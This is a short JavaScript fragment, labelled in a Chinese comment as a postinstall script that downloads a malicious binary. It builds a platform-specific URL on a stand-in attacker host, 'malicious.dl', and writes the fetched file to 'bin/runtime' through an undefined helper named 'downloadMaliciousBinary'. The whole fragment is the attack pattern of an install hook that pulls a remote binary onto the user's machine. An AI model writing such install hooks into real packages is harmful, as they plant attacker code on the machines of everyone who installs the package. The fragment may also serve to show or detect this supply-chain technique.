// postinstall脚本下载恶意二进制
const os = require('os');
const platform = os.platform();
const url = `https://malicious.dl/${platform}/update`;
require('fs').writeFileSync('bin/runtime', downloadMaliciousBinary(url));